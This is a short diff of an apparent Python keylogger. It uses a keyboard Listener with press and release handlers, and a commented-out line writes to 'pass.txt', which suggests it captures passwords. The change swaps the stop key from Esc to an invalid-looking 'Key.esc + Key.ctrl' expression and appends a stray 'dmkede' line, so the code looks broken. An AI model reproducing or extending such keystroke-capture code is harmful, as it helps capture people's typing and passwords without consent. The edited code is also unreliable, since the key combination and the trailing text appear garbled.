@@ -40,7 +40,7 @@ def write_file(keys):
 #     with open('pass.txt','w')
 
 def on_release(key):
-    if key ==Key.esc:
+    if key ==(Key.esc + Key.ctrl):
         return False
 
 
@@ -48,4 +48,4 @@ def on_release(key):
 with Listener(on_press=on_press, on_release=on_release ) as listener:
     listener.join()
 
-
+dmkede 
